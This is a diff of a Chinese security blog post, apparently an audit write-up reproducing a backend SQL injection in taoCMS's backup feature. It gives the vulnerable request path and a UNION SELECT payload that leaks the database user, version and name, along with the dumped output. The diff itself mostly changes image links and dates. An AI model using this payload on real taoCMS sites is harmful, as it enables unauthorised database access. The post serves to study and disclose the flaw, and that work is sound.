@@ -16,24 +16,24 @@
   <meta name="author" content="X1ly?S">
   <meta name="keywords" content="网络安全 渗透测试">
   
-    <meta name="description" content="环境搭建 我用的是 phpstudy2018+php-5.4.45+Apache    白盒审计 手工审计  审计思路选择由于功能点太多了，于是果断pass掉功能点审计法与SQL语句监控法，因为功能点太多，那么需要触发的SQL语句也会很多，一时半会还真不好找，于是我选择正则表达式审计法   1(?:SELECT|INSERT INTO|UPDATE|DELETE FROM|CREATE TABLE">
+    <meta name="description" content="环境搭建 我用的是 phpstudy2018+php-5.4.45+Apache   白盒审计 手工审计  审计思路选择由于功能点太多了，于是果断pass掉功能点审计法与SQL语句监控法，因为功能点太多，那么需要触发的SQL语句也会很多，一时半会还真不好找，于是我选择正则表达式审计法  1(?:SELECT|INSERT INTO|UPDATE|DELETE FROM|CREATE TABLE|D">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP-代码审计项目-taoCMS-后台注入">
 <meta property="og:url" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="X1ly?S Blog">
-<meta property="og:description" content="环境搭建 我用的是 phpstudy2018+php-5.4.45+Apache    白盒审计 手工审计  审计思路选择由于功能点太多了，于是果断pass掉功能点审计法与SQL语句监控法，因为功能点太多，那么需要触发的SQL语句也会很多，一时半会还真不好找，于是我选择正则表达式审计法   1(?:SELECT|INSERT INTO|UPDATE|DELETE FROM|CREATE TABLE">
+<meta property="og:description" content="环境搭建 我用的是 phpstudy2018+php-5.4.45+Apache   白盒审计 手工审计  审计思路选择由于功能点太多了，于是果断pass掉功能点审计法与SQL语句监控法，因为功能点太多，那么需要触发的SQL语句也会很多，一时半会还真不好找，于是我选择正则表达式审计法  1(?:SELECT|INSERT INTO|UPDATE|DELETE FROM|CREATE TABLE|D">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/1.png">
-<meta property="og:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/2.png">
-<meta property="og:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/3.png">
-<meta property="og:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/4.png">
-<meta property="og:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/5.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/21/Fzvrk6QNnPKcYWu.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/21/OcKBZDzwJaRrft6.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/21/qdCVrSRk2pEAWah.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/21/1dOm7CMzr6FNHPn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/21/WRMEKeiFlDrhGUt.png">
 <meta property="article:published_time" content="2024-08-31T09:19:30.000Z">
-<meta property="article:modified_time" content="2024-08-31T09:20:20.352Z">
+<meta property="article:modified_time" content="2024-10-21T14:34:28.629Z">
 <meta property="article:author" content="X1ly?S">
 <meta property="article:tag" content="taoCMS-后台注入">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://example.com/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/1.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/10/21/Fzvrk6QNnPKcYWu.png">
   
   
   
@@ -333,7 +333,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年8月31日 下午
+                    本文最后更新于 2024年10月21日 晚上
                   
                 
               </p>
@@ -344,18 +344,15 @@
                 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
 <li>我用的是 phpstudy2018+php-5.4.45+Apache</li>
 </ul>
-<img src="/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/21/Fzvrk6QNnPKcYWu.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><blockquote>
 <p>手工审计</p>
 </blockquote>
 <h3 id="审计思路选择"><a href="#审计思路选择" class="headerlink" title="审计思路选择"></a>审计思路选择</h3><p>由于功能点太多了，于是果断pass掉功能点审计法与SQL语句监控法，因为功能点太多，那么需要触发的SQL语句也会很多，一时半会还真不好找，于是我选择正则表达式审计法</p>
-<img src="/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/2.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/21/OcKBZDzwJaRrft6.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">(?:SELECT|INSERT INTO|UPDATE|DELETE FROM|CREATE TABLE|DROP TABLE|ALTER TABLE)\b[\s\S]*?;<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/3.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/21/qdCVrSRk2pEAWah.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>一共匹配到的有效SQL语句也就30来条左右，通过简单看看这些SQL语句，又可以排除大部分明显不可控的固定的SQL语句，那么剩下的就一条一条验证看是否可控</p>
 <p>最终觉得 **\include\Model\Datastore.php **这个文件中的一处SQL语句有点可疑</p>
 <p>开始着重审计</p>
@@ -373,15 +370,13 @@
 <p>查看后台首页地址是: &#x2F;admin&#x2F;admin.php?action&#x3D;frame&amp;ctrl&#x3D;iframes</p>
 <p>那么触发的地址应该是：?action&#x3D;datastore&amp;ctrl&#x3D;create&amp;bulist&#x3D;xxxxxxx</p>
 <p>或者根据功能点去找，因为这是备份功能，那么就去翻找有备份字眼的功能点</p>
-<img src="/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/4.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/21/1dOm7CMzr6FNHPn.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>ok，到此就找到了黑盒触发点了</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>hackbar发包</p>
 <p>payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">bulist<span class="hljs-operator">=</span>admin <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">user</span>()),(version()),(database()),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/08/31/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-taoCMS-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/5.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/21/WRMEKeiFlDrhGUt.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>成功下载备份文件</p>
 <p>打开看看</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">REPLACE <span class="hljs-keyword">INTO</span> cms_admin <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">user</span>()),(version()),(database()),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> (id,name,emails,passwd,auth,times,ips,status) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;tao&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>);<br>REPLACE <span class="hljs-keyword">INTO</span> cms_admin <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">user</span>()),(version()),(database()),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> (id,name,emails,passwd,auth,times,ips,status) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;root@localhost&#x27;</span>,<span class="hljs-string">&#x27;5.5.53&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>)<br></code></pre></td></tr></table></figure>
